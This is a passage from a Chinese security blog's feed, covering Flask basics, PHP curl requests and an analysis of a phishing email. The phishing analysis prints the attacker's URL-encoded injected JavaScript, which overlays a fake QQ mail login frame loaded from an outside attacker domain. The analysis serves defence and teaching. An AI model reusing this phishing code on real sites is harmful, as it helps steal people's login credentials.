it&#x27;s there</span><br>    session.pop(<span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br><span class="hljs-comment"># set the secret key.  keep this really secret:</span><br>app.secret_key = <span class="hljs-string">&#x27;A0Zr98j/3yX R~XHH!jmN]LWX/,?RT&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>对浅显基础的知识进行学习，虽然对开发能力提升不大，但是有的时候遇到一些python后端或者需要搭建python后端漏洞环境进行测试时，如果没有接触过相关函数就会力不从心，对这些模块略微了解并总结一下，在之后遇到的时候就可以更熟练的进行审计或搭建。</p><p>之后在遇到很重要的模块或者语言时，也要通过同样的方式总结一遍，等用到的时候就可以很快的入门。</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php curl方法总结</title>
    <link href="/2018/05/24/php-curl%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <url>/2018/05/24/php-curl%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>做web安全的同时也需要优秀的开发能力，所以最近想提升一下自己python和php的开发能力，对一些经常用的方法做一个总结，当作笔记。</p><p>curl方法在总结ssrf漏洞时用过，但是我当时没有做详细的说明，就放在这里总结一下。</p><h2 id="0x00-curl"><a href="#0x00-curl" class="headerlink" title="0x00 curl"></a>0x00 curl</h2><p>PHP的libcurl库用来与各种的服务器使用各种类型的协议进行连接和通讯。</p><p>libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</p><p>PHP中使用cURL实现Get和Post请求的方法。</p><p>百度百科用一句话总结了curl的能力： </p><ul><li>php curl就是php中的数据传输神器。</li></ul><h2 id="0x01-基本方法"><a href="#0x01-基本方法" class="headerlink" title="0x01 基本方法"></a>0x01 基本方法</h2><p>可以看到php curl库中封装的方法特别多，但我们平时用curl请求，大多数情况要做的的基本步骤有如下四步：</p><h4 id="①：初始化"><a href="#①：初始化" class="headerlink" title="①：初始化"></a>①：初始化</h4><p>curl_init()</p><p>初始化一个新的会话，返回一个cURL句柄，供curl_setopt(), curl_exec()和curl_close() 函数使用。</p><p>用法：</p><ul><li>curl_init(url)</li></ul><p>参数：</p><ul><li>url：如果提供了该参数，CURLOPT_URL 选项将会被设置成这个值。</li></ul><p>返回值：</p><ul><li>如果成功，返回一个cURL句柄，出错返回 FALSE。</li></ul><h4 id="②：设置属性"><a href="#②：设置属性" class="headerlink" title="②：设置属性"></a>②：设置属性</h4><p>curl_setopt()</p><p>为给定的cURL会话句柄设置一个选项。</p><p>用法：</p><ul><li>curl_setopt ( resource $ch , int $option , mixed $value )</li></ul><p>参数：</p><ul><li>ch： 由 curl_init() 返回的 cURL 句柄。</li><li>option： 需要设置的CURLOPT_XXX选项。</li><li>value：将设置在option选项上的值。</li></ul><p>返回值：</p><ul><li>成功时返回 TRUE， 或者在失败时返回 FALSE。</li></ul><h4 id="③：执行并获取结果"><a href="#③：执行并获取结果" class="headerlink" title="③：执行并获取结果"></a>③：执行并获取结果</h4><p>curl_exec()</p><p>执行给定的cURL会话。</p><p>用法：</p><ul><li>curl_exec ( resource $ch )</li></ul><p>参数：</p><ul><li>ch： 由 curl_init() 返回的 cURL 句柄。</li></ul><p>返回值：</p><ul><li>成功时返回 TRUE， 或者在失败时返回 FALSE。 然而，如果 CURLOPT_RETURNTRANSFER选项被设置，函数执行成功时会返回执行的结果，失败时返回 FALSE 。</li></ul><h4 id="④：释放句柄"><a href="#④：释放句柄" class="headerlink" title="④：释放句柄"></a>④：释放句柄</h4><p>curl_close()</p><p>关闭一个cURL会话并且释放所有资源。cURL句柄ch 也会被释放。</p><p>用法：</p><ul><li>curl_close ( resource $ch )</li></ul><p>参数：</p><ul><li>ch： 由 curl_init() 返回的 cURL 句柄。</li></ul><p>返回值：</p><ul><li>无</li></ul><h2 id="0x02-get请求"><a href="#0x02-get请求" class="headerlink" title="0x02 get请求"></a>0x02 get请求</h2><p>get请求是http请求中最基本的请求，一个普通的get请求只需初始化后，配置好url和一定量的参数，然后执行即可。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$curl</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>);<br><span class="hljs-comment">//设置头文件的信息作为数据流输出</span><br><span class="hljs-comment">//curl_setopt($curl, CURLOPT_HEADER, 1);</span><br><span class="hljs-comment">//设置获取的信息以文件流的形式返回，而不是直接输出。</span><br>curl_setopt(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//执行命令</span><br><span class="hljs-variable">$data</span> = curl_exec(<span class="hljs-variable">$curl</span>);<br><span class="hljs-comment">//关闭URL请求</span><br>curl_close(<span class="hljs-variable">$curl</span>);<br><span class="hljs-comment">//显示获得的数据</span><br><span class="hljs-comment">//print_r($data);</span><br>var_dump(<span class="hljs-variable">$data</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以看到，设置CURLOPT_RETURNTRANSFER为0，使用php请求百度页面，结果如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$curl</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-string">&#x27;http://www.baidu.com&#x27;</span>);<br><span class="hljs-comment">//设置头文件的信息作为数据流输出</span><br><span class="hljs-comment">//curl_setopt($curl, CURLOPT_HEADER, 1);</span><br><span class="hljs-comment">//设置获取的信息以文件流的形式返回，而不是直接输出。</span><br>curl_setopt(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-comment">//执行命令</span><br><span class="hljs-variable">$data</span> = curl_exec(<span class="hljs-variable">$curl</span>);<br><span class="hljs-comment">//关闭URL请求</span><br>curl_close(<span class="hljs-variable">$curl</span>);<br><span class="hljs-comment">//显示获得的数据</span><br><span class="hljs-comment">//print_r($data);</span><br>var_dump(<span class="hljs-variable">$data</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>如果设置CURLOPT_RETURNTRANSFER为1,则不会将获取的页面直接输出在页面内，结果如下：</p><h2 id="0x03-post请求"><a href="#0x03-post请求" class="headerlink" title="0x03 post请求"></a>0x03 post请求</h2><p>post请求也是http请求中很重要的一种，既然是post请求，肯定要额外设置要post的数据才行，curl中需要配置CURLOPT_POST为1代表本次请求是post类型，然后再将要请求的数据通过CURLOPT_POSTFIELDS配置进本次请求，然后执行就可以提交post请求。</p><p>这里我们用上一篇有关iframe框架钓鱼的留言界面进行测试，我们将留言的昵称和内容设置好，通过php curl方法请求。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$curl</span> = curl_init();<br>curl_setopt(<span class="hljs-variable">$curl</span>,CURLOPT_URL,<span class="hljs-string">&quot;http://127.0.0.1/curl/xss.php&quot;</span>);<br><span class="hljs-comment">//设置获取的信息以文件流的形式返回，而不是直接输出。</span><br>curl_setopt(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-comment">//设置请求模式为post型</span><br>curl_setopt(<span class="hljs-variable">$curl</span>, CURLOPT_POST, <span class="hljs-number">1</span>);<br><span class="hljs-comment">//配置post的数据</span><br><span class="hljs-variable">$post_data</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&quot;curl_test&quot;</span>,<br><span class="hljs-string">&quot;message&quot;</span> =&gt; <span class="hljs-string">&quot;heyheyhey&quot;</span><br>);<br><span class="hljs-comment">//全部数据使用HTTP协议中的&quot;POST&quot;操作来发送。</span><br>curl_setopt(<span class="hljs-variable">$curl</span>, CURLOPT_POSTFIELDS, <span class="hljs-variable">$post_data</span>);<br><span class="hljs-comment">//执行请求</span><br><span class="hljs-variable">$data</span> = curl_exec(<span class="hljs-variable">$curl</span>);<br><span class="hljs-comment">//关闭请求</span><br>curl_close(<span class="hljs-variable">$curl</span>);<br><span class="hljs-comment">//显示数据</span><br>print_r(<span class="hljs-variable">$data</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据返回的页面，发现这条留言已经被写入。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>在需要使用php获取页面内容时，其实可以通过更加简单的file_get_contents()函数，如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span>=file_get_contents(<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>);<br>print_r(<span class="hljs-variable">$data</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>但是学习curl是非常有必要的，curl虽然配置的参数更繁杂，但是相对应的支持的操作也就更多，比如cookies、验证、表单提交、文件上传等等，需要更加细致的操作时，就应该选用curl。</p>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分析并复现一次iframe框架钓鱼行为</title>
    <link href="/2018/05/21/%E5%88%86%E6%9E%90%E5%B9%B6%E5%A4%8D%E7%8E%B0%E4%B8%80%E6%AC%A1iframe%E6%A1%86%E6%9E%B6%E9%92%93%E9%B1%BC%E8%A1%8C%E4%B8%BA/"/>
    <url>/2018/05/21/%E5%88%86%E6%9E%90%E5%B9%B6%E5%A4%8D%E7%8E%B0%E4%B8%80%E6%AC%A1iframe%E6%A1%86%E6%9E%B6%E9%92%93%E9%B1%BC%E8%A1%8C%E4%B8%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>事情的起因是这样的，这几天正在玩手机的时候忽然收到一封邮件名是校园通知发件人是西安电子科技大学的邮件，然后顺手打开邮箱一看， <a href="http://mrw.so/">http://mrw.so/</a> 的短链接，邮箱是一串随便注册的前缀，是钓鱼邮件没错了。看到同时抄送了那么多人，应该是在哪里注册后公开的邮箱和学校信息被人爬去批量发邮件钓鱼了。不过既然碰到了钓鱼，点开分析一下肯定是要做的。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing01.png"></p><h2 id="0x01-尝试"><a href="#0x01-尝试" class="headerlink" title="0x01 尝试"></a>0x01 尝试</h2><p>点击短链接跳转到了 <a href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a><br> 并且在加载出来之前一直显示一个很刻意的“链接中”，并且url有好长的路径，看样子像是哪个公司的服务器被钓鱼作者放了点东西，直接访问了下 <a href="http://www.topaone.com/">http://www.topaone.com</a> 发现果然是一个叫京品设计的公司。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing02.png"></p><p>加载出来之后是一个qq邮箱的登陆解面，不过做的很不走心，网页title都没写qq邮箱，title旁边的ico也是qq空间而不是qq邮箱的ico，登陆框除了账号密码两个输入框和登陆按钮以外都是不可点击状态。随便填一个账号密码弹窗提示密码错误，而且返回信息的网址应该是钓鱼作者的服务器。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing03.png"></p><p>还有一点是在进入这个链接的时候，即使已经到了邮箱登陆页面，浏览器仍然一直处于加载状态，以之前自己写钓鱼网站的经验来猜测，对方应该使用了window.onload配合document.write来覆盖整个页面，所以每次加载完都会重触发一次window.onload，无限循环。</p><h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>见识了一下大致的访问过程，该抓包看看具体是怎么个流程了，在burpsuite中截取数据包，发现访问到的页面返回了一堆编码过的js代码。</p><p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing04.png"></p><p>初步判断这个钓鱼作者在京品设计公司的服务器上面挂了一个存储型xss。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>&lt;!--<br><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-built_in">unescape</span>(<span class="hljs-string">&quot;%3Cscript%3E%0D%0A%3C%21--%0D%0Adocument.write%28unescape%28%22%253C%2521--%2523Include%2520File%253D%2522SqlIn.Asp%2522--%253E%250D%250A%253Chtml%253E%250D%250A%253Chead%253E%250D%250A%253Cmeta%2520http-equiv%253D%2522Content-Language%2522%2520content%253D%2522zh-cn%2522%253E%250D%250A%253Cmeta%2520HTTP-EQUIV%253D%2522Content-Type%2522%2520CONTENT%253D%2522text/html%253B%2520charset%253Dgb2312%2522%253E%250D%250A%253Ctitle%253Eukkifddssfggg---kuasa......%253C/title%253E%250D%250A%253Cmeta%2520name%253D%2522description%2522%2520content%253D%2522%2522%253E%250D%250A%253Clink%2520href%253D%2522index_files/88.css%253Fmax_age%253D31536000%2526d%253D1333188324128%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%253Clink%2520href%253D%2522index_files/home_fixed.css%253Fmax_age%253D31536000%2526d%253D1334659684120%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%250D%250A%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%250D%250A%253Cstyle%2520id%253D%2522mainJSBg%2522%2520type%253D%2522text/css%2522%253E%250D%250A.lay_background%257Bbackground-repeat%253Ano-repeat%253Bbackground-position%253Acenter%2520top%253Bbackground-attachment%253Ascroll%253Bbackground-image%253Aurl%252864538_top.jpg%2529%253B%257D%250D%250Abody%257Bbackground-image%253Aurl%252864538_bg.jpg%2529%253B%2520background-repeat%253Arepeat%253B%257D%253C/style%253E%250D%250A%250D%250A%250D%250A%253Cstyle%2520type%253D%2522text/css%2522%2520id%253D%2522dynamicStyle%2522%253E%250D%250A.ownermode%257Bdisplay%253Anone%253B%257D%250D%250A.clientmode%257Bdisplay%253A%253B%257D%250D%250A.editmode%257Bdisplay%253Anone%253B%257D%250D%250A.customoff%257Bdisplay%253A%253B%257D%250D%250A.alphamode%257Bdisplay%253Anone%253B%257D%250D%250A%253C/style%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253C/style%253E%250D%250A%253Clink%2520rel%253D%2522Shortcut%2520Icon%2522%2520href%253D%2522http%253A//ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%253E%250D%250A%253C/head%253E%250D%250A%253Cbody%2520id%253D%2522QZ_Body%2522%2520class%253D%2522bg_body%2520%2520%2522%253E%250D%250A%250D%250A%253Cdiv%2520id%253D%2522welcomeflash%2522%2520style%253D%2522position%253Afixed%253B_position%253Aabsolute%253Btop%253A0%253Bleft%253A0%253Bbackground-color%253Awhite%253Btext-align%253Acenter%253Bwidth%253A100%2525%253Bz-index%253A30000%253Bheight%253A10000px%253B%2522%2520onClick%253D%2522wSwf_obj_swf.call%2528this%2529%2522%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bposition%253Aabsolute%253Bleft%253A0%253Btop%253A0%253Bbackground%253Awhite%253Bheight%253A100%2525%253B%2522%253E%250D%250A%250D%250A%253C%25u94FE%25u63A5%25u4E2D%25B7%25B7%25B7%25B7%25B7%253E%250D%250A%250D%250A%253C/div%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bcursor%253Apointer%253Bposition%253Aabsolute%253Bleft%253A0px%253Bbackground%253Aurl%2528about%253Ablank%2529%253Bopacity%253A0%253Bz-index%253A30001%253Btop%253A0px%253Bheight%253A100%2525%2522%253E%253C/div%253E%253C/div%253E%250D%250A%253Cscript%2520type%253D%2522text/javascript%2522%253E%250D%250A%2528function%2528%2529%2520%257B%250D%250A%2509var%2520wel%253Ddocument.getElementById%2528%2527welcomeflash%2527%2529%252Ctimer%252Cch%252C_s%253Dnew%2520Function%253B%250D%250A%2509window.wSwf_obj_swf%2520%253D%2520window.wSwf_obj_swf_s%253Dfunction%2528%2529%2520%257B%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522%2522%253B%250D%250A%2509%2509wel%2520%2526%2526%2520%2528wel.innerHTML%2520%253D%2520%2527%2527%2529%253B%250D%250A%2509%2509wel%2520%2526%2526%2520document.body.removeChild%2528wel%2529%253B%250D%250A%2509%2509window.removeEventListener%253Fwindow.removeEventListener%2528%2527resize%2527%252C_s%2529%253A%2528window.detachEvent%2526%2526window.detachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%2509clearTimeout%2528timer%2529%253B%250D%250A%2509%257D%253B%250D%250A%2509timer%2520%253D%2520setTimeout%2528wSwf_obj_swf%252C%25204000%2529%253B%250D%250A%2509if%2520%2528wel%2529%2520%257B%250D%250A%2509%2509_s%253Dfunction%2528%2529%257B%250D%250A%2509%2509%2509ch%253Ddocument.documentElement.clientHeight%253B%250D%250A%2509%2509%2509wel.children%255B0%255D.style.paddingTop%2520%253D%2520Math.floor%2528Math.max%25280%252Cch%2520-%2520590%2529%2520/%25202%2529+%2527px%2527%253B%250D%250A%2509%2509%257D%253B%250D%250A%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522hidden%2522%253B%250D%250A%2509%2509_s%2528%2529%253B%250D%250A%2509%2509window.addEventListener%253Fwindow.addEventListener%2528%2527resize%2527%252C_s%252Cfalse%2529%253A%2528window.attachEvent%2526%2526window.attachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%257D%250D%250A%257D%2529%2528%2529%253B%250D%250A%253C/script%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%250D%250A%253Ciframe%2520id%253D%2522iframe%2522%2520%2520%2520height%253D%2522100%2525%2522%2520width%253D%2522100%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%250D%250A%2520%2520%253Cscript%2520%2520%2520language%253D%2522javascript%2522%253E%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520var%2520pos%252Cstr%252Cpara%252Curl%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520str%2520%253D%2520window.location.href%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520pos%2520%253D%2520str.indexOf%2528%2522%253F%2522%2529%2520%2520%253B%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520url%2520%253D%2520str.substring%2528pos+1%2529%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2528pos%253E0%2529%257B%2520%2520%250D%250A%2509%2509%2509%2509n%253D%2527http%253A//ujhgdgjalkfja2.tk/%2527%253B%250D%250A%2509%2509%2509%2509j1%253Dn+url%253B%250D%250A%2509%2509%2509%2509c%253D%2527%253Clink%2520rel%253D%2522shortcut%2520icon%2522%2520href%253D%2522https%253A//s.tbcdn.cn/apps/login/static/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%2520/%253E%2527%253B%250D%250A%2509%2509%2509%2509b%253D%2527%253Chtml%253E%253Chead%253E%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%2527%253B%250D%250A%2509%2509%2509%2509a%253D%2527%253Ciframe%2520name%253D%2522main%2522%2520%2520height%253D%2522100%2525%2522%2520src%253D%2522%2527%253B%250D%250A%2509%2509%2509%2509k1%253D%2527%2522%2520width%253D%2522101%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%2527%253B%250D%250A%2520%2509%2509%2509%2509var%2520%2520d%2520%253D%2520%2520window.frames%255B0%255D%253B%250D%250A%2520%2520%2509%2509%2509%2509d.document.write%2528c+b+a+j1+k1%2529%253B%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520else%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%253C/script%253E%250D%250A%2520%2520%250D%250A%250D%250A%253Chead%253E%22%29%29%3B%0D%0A//--%3E%0D%0A%3C/script%3E&quot;</span>));</span><br><span class="javascript"><span class="hljs-comment">//--&gt;</span></span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这个钓鱼网站作者没有对代码做什么加密，明显只是多次编码过的js代码，直接url解码两次，得到清晰的js代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>&lt;!--<br><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-built_in">unescape</span>(<span class="hljs-string">&quot;&lt;script&gt;</span></span><br>&lt;!--<br><span class="handlebars"><span class="xml">document.write(unescape(&quot;<span class="hljs-comment">&lt;!--#Include File=&quot;SqlIn.Asp&quot;--&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Language&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;zh-cn&quot;</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">HTTP-EQUIV</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">CONTENT</span>=<span class="hljs-string">&quot;text/html; charset=gb2312&quot;</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ukkifddssfggg---kuasa......<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index_files/88.css?max_age=31536000&amp;d=1333188324128&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index_files/home_fixed.css?max_age=31536000&amp;d=1334659684120&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span></span></span><br><br><span class="handlebars"><span class="xml"><span class="hljs-comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="hljs-comment">&lt;!--&lt;base href=&quot;&quot;&gt;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;.&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="hljs-comment">&lt;!--&lt;base href=&quot;&quot;&gt;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;.&quot;</span>&gt;</span><span 